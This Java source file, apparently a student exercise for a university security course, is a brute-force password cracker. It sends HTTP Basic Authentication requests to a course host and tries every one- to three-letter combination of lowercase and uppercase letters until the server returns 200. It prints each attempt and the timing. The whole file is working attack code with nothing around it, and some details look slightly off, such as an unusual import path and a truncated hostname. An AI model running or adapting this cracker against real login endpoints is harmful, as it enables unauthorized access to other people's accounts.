import java.io.*;
import java.util.Date;





import java.jscape.inet.http.*;  







class BruteForce
{
   public static void main (String args[]) throws Exception
   {
      String username = "";
      byte asciiLower[] = {97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122};
      byte asciiUpper[] = {65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90}; 
    
      int errorMessage = 401;
      int firstPosition = 0;
      int secondPosition = 0;
      int thirdPosition = 0; 
      int number = 1;
      int attempts = 0;
      
      Http http = new Http();
      HttpRequest request = new HttpRequest ("http://sec-crack.cs.rmit.edu./SEC/2/" );
      Date startDate = new Date(); 
      
      
     
      for(firstPosition = 0; firstPosition < 26; firstPosition++)
      {
         String one = new String (asciiLower, firstPosition, number);
         String password = one;
         request.setBasicAuthentication(username,password);
         HttpResponse response = http.getResponse(request);
         errorMessage = response.getResponseCode();
         System.out.println(errorMessage);
         System.out.println(password);
         attempts++;
         if (errorMessage == 200)
            break;
      }

       

      if (errorMessage == 401)
      {
         for(firstPosition = 0; firstPosition < 26; firstPosition++)
         {
            String one = new String (asciiUpper, firstPosition, number);
            String password = one;
            request.setBasicAuthentication(username,password);
            HttpResponse response = http.getResponse(request);
            errorMessage = response.getResponseCode();
            System.out.println(errorMessage);
            System.out.println(password);
            attempts++;
            if (errorMessage == 200)
               break;
         }
      }

      

       if (errorMessage == 401)
      {
         for (firstPosition = 0; firstPosition < 26; firstPosition ++)
         { 
            for(secondPosition = 0; secondPosition < 26; secondPosition++)
            {
               String one = new String(asciiLower, firstPosition,number);
               String two = new String (asciiLower, secondPosition, number);
               String password = one + two;
               request.setBasicAuthentication(username,password);
               HttpResponse response = http.getResponse(request);
               errorMessage = response.getResponseCode();
               System.out.println(errorMessage);
               System.out.println(password);
               attempts++;
               if (errorMessage == 200)
                  break;
            }
            if (errorMessage == 200)
               break;
         }
      }  

       

       if (errorMessage == 401)
      { 
         for (firstPosition = 0; firstPosition < 26; firstPosition ++)
         { 
            for(secondPosition = 0; secondPosition < 26; secondPosition++)
            {
               String one = new String(asciiUpper, firstPosition,number);
               String two = new String (asciiUpper, secondPosition, number);
               String password = one + two;
               request.setBasicAuthentication(username,password);
               HttpResponse response = http.getResponse(request);
               errorMessage = response.getResponseCode();
               System.out.println(errorMessage);
               System.out.println(password);
               attempts++;
               if (errorMessage == 200)
                  break;
            }
            if (errorMessage == 200)
               break;
         }
      }

      

      if(errorMessage == 401)
      {
         for (firstPosition = 0; firstPosition < 26; firstPosition ++)
         { 
            for(secondPosition = 0; secondPosition < 26; secondPosition++)
            {
               String one = new String(asciiUpper, firstPosition,number);
               String two = new String (asciiLower, secondPosition, number);
               String password = one + two;
               request.setBasicAuthentication(username,password);
               HttpResponse response = http.getResponse(request);
               errorMessage = response.getResponseCode();
               System.out.println(errorMessage);
               System.out.println(password);
               attempts++;
               if (errorMessage == 200)
                  break;
            }
            if (errorMessage == 200)
               break;
         }
      }

      

      if (errorMessage == 401)
      {
         for (firstPosition = 0; firstPosition < 26; firstPosition ++)
         { 
            for(secondPosition = 0; secondPosition < 26; secondPosition++)
            {
               for(thirdPosition = 0; thirdPosition <26; thirdPosition++)
               { 
                  String one = new String(asciiLower, firstPosition,number);
                  String two = new String (asciiLower, secondPosition, number);
                  String three = new String (asciiLower, thirdPosition, number); 
                  String password = one + two + three;
                  request.setBasicAuthentication(username,password);
                  HttpResponse response = http.getResponse(request);
                  errorMessage = response.getResponseCode();
                  System.out.println(errorMessage);
                  System.out.println(password);
                  attempts++;
                  if (errorMessage == 200)
                     break;
               }
               if (errorMessage == 200)
                  break;
            }
            if (errorMessage == 200)
               break;
         }      
      }

      

      if (errorMessage == 401)
      {
         for (firstPosition = 0; firstPosition < 26; firstPosition ++)
         { 
            for(secondPosition = 0; secondPosition < 26; secondPosition++)
            {
               for(thirdPosition = 0; thirdPosition <26; thirdPosition++)
               { 
                  String one = new String(asciiUpper, firstPosition,number);
                  String two = new String (asciiUpper, secondPosition, number);
                  String three = new String (asciiUpper, thirdPosition, number); 
                  String password = one + two + three;
                  request.setBasicAuthentication(username,password);
                  HttpResponse response = http.getResponse(request);
                  errorMessage = response.getResponseCode();
                  System.out.println(errorMessage);
                  System.out.println(password);
                  attempts++;
                  if (errorMessage == 200)
                     break;
               }
               if (errorMessage == 200)
                  break;
            }
            if (errorMessage == 200)
               break;
         }      
      }


      

      if (errorMessage == 401)
      {
         for (firstPosition = 0; firstPosition < 26; firstPosition ++)
         { 
            for(secondPosition = 0; secondPosition < 26; secondPosition++)
            {
               for(thirdPosition = 0; thirdPosition <26; thirdPosition++)
               { 
                  String one = new String(asciiUpper, firstPosition,number);
                  String two = new String (asciiLower, secondPosition, number);
                  String three = new String (asciiLower, thirdPosition, number); 
                  String password = one + two + three;
                  request.setBasicAuthentication(username,password);
                  HttpResponse response = http.getResponse(request);
                  errorMessage = response.getResponseCode();
                  System.out.println(errorMessage);
                  System.out.println(password);
                  attempts++;
                  if (errorMessage == 200)
                     break;
               }
               if (errorMessage == 200)
                  break;
            }
            if (errorMessage == 200)
               break;
         }      
      }

      

      if (errorMessage == 401)
      {
         for (firstPosition = 0; firstPosition < 26; firstPosition ++)
         { 
            for(secondPosition = 0; secondPosition < 26; secondPosition++)
            {
               String one = new String(asciiLower, firstPosition,number);
               String two = new String (asciiUpper, secondPosition, number);
               String password = one + two;
               request.setBasicAuthentication(username,password);
               HttpResponse response = http.getResponse(request);
               errorMessage = response.getResponseCode();
               System.out.println(errorMessage);
               System.out.println(password);
               attempts++;
               if (errorMessage == 200)
                  break;
            }
            if (errorMessage == 200)
               break;
         }
      }

      

      if (errorMessage == 401)
      {
         for (firstPosition = 0; firstPosition < 26; firstPosition ++)
         { 
            for(secondPosition = 0; secondPosition < 26; secondPosition++)
            {
               for(thirdPosition = 0; thirdPosition <26; thirdPosition++)
               { 
                  String one = new String(asciiLower, firstPosition,number);
                  String two = new String (asciiLower, secondPosition, number);
                  String three = new String (asciiUpper, thirdPosition, number); 
                  String password = one + two + three;
                  request.setBasicAuthentication(username,password);
                  HttpResponse response = http.getResponse(request);
                  errorMessage = response.getResponseCode();
                  System.out.println(errorMessage);
                  System.out.println(password);
                  attempts++;
                  if (errorMessage == 200)
                     break;
               }  
               if (errorMessage == 200)
                     break; 
            }
            if (errorMessage == 200)
                     break;
         }
      }

      

      if (errorMessage == 401)
      {
         for (firstPosition = 0; firstPosition < 26; firstPosition ++)
         { 
            for(secondPosition = 0; secondPosition < 26; secondPosition++)
            {
               for(thirdPosition = 0; thirdPosition <26; thirdPosition++)
               { 
                  String one = new String(asciiLower, firstPosition,number);
                  String two = new String (asciiUpper, secondPosition, number);
                  String three = new String (asciiUpper, thirdPosition, number); 
                  String password = one + two + three;
                  request.setBasicAuthentication(username,password);
                  HttpResponse response = http.getResponse(request);
                  errorMessage = response.getResponseCode();
                  System.out.println(errorMessage);
                  System.out.println(password);
                  attempts++;
                  if (errorMessage == 200)
                     break;
               }  
               if (errorMessage == 200)
                     break; 
            }
            if (errorMessage == 200)
                     break;
         }
      }

      

      if (errorMessage == 401)
      {
         for (firstPosition = 0; firstPosition < 26; firstPosition ++)
         { 
            for(secondPosition = 0; secondPosition < 26; secondPosition++)
            {
               for(thirdPosition = 0; thirdPosition <26; thirdPosition++)
               { 
                  String one = new String(asciiLower, firstPosition,number);
                  String two = new String (asciiUpper, secondPosition, number);
                  String three = new String (asciiLower, thirdPosition, number); 
                  String password = one + two + three;
                  request.setBasicAuthentication(username,password);
                  HttpResponse response = http.getResponse(request);
                  errorMessage = response.getResponseCode();
                  System.out.println(errorMessage);
                  System.out.println(password);
                  attempts++;
                  if (errorMessage == 200)
                     break;
               }
               if (errorMessage == 200)
                  break;
            }
            if (errorMessage == 200)
                  break;
         }
      }

      
      
       if (errorMessage == 401)
      {
         for (firstPosition = 0; firstPosition < 26; firstPosition ++)
         { 
            for(secondPosition = 0; secondPosition < 26; secondPosition++)
            {
               for(thirdPosition = 0; thirdPosition <26; thirdPosition++)
               { 
                  String one = new String(asciiUpper, firstPosition,number);
                  String two = new String (asciiUpper, secondPosition, number);
                  String three = new String (asciiLower, thirdPosition, number); 
                  String password = one + two + three;
                  request.setBasicAuthentication(username,password);
                  HttpResponse response = http.getResponse(request);
                  errorMessage = response.getResponseCode();
                  System.out.println(errorMessage);
                  System.out.println(password);
                  attempts++;
                  if (errorMessage == 200)
                     break;
               }
               if (errorMessage == 200)
                  break;
            }
            if (errorMessage == 200)
                  break;
         }
      }

      

      if (errorMessage == 401)
      {
         for (firstPosition = 0; firstPosition < 26; firstPosition ++)
         { 
            for(secondPosition = 0; secondPosition < 26; secondPosition++)
            {
               for(thirdPosition = 0; thirdPosition <26; thirdPosition++)
               { 
                  String one = new String(asciiUpper, firstPosition,number);
                  String two = new String (asciiLower, secondPosition, number);
                  String three = new String (asciiUpper, thirdPosition, number); 
                  String password = one + two + three;
                  request.setBasicAuthentication(username,password);
                  HttpResponse response = http.getResponse(request);
                  errorMessage = response.getResponseCode();
                  System.out.println(errorMessage);
                  System.out.println(password);
                  attempts++;
                   if (errorMessage == 200)
                     break;
               }
               if (errorMessage == 200)
                  break;
            }
            if (errorMessage == 200)
                  break;
         }
      }
             
       
      Date endDate = new Date();
      System.out.println("Password crack finished: " + endDate);
      System.out.println("Password crack started: " + startDate);
      System.out.println(" of attempts: " + attempts);
   }
}

     
  








         

         

        





           
        
           
      